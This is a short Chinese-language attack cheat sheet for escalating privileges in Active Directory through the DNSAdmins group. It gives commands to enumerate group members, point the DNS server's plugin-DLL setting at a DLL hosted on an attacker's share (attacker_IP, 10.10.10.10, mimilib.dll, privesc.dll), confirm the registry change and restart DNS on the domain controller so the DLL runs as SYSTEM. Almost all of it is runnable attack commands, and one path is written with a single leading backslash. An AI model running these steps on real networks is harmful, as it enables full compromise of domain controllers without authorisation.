	DNSAdmins 组的成员可以加载具有 dns.exe (SYSTEM) 权限的任意 DLL。
	需要权限才能重新启动 DNS 服务。
	枚举 DNSAdmins 组的成员
	>Get-NetGroupMember -GroupName "DNSAdmins"
	>Get-ADGroupMember -Identity DNSAdmins
	更改 DNS 服务加载的 dll
	使用RSAT
	>dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
	>dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll
	使用DNSServer模块
	$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
	$dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
	Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
	检查上一条命令是否成功
	>Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
	重新启动 DNS
	>sc \\dc01 stop dns
	>sc \\dc01 start dns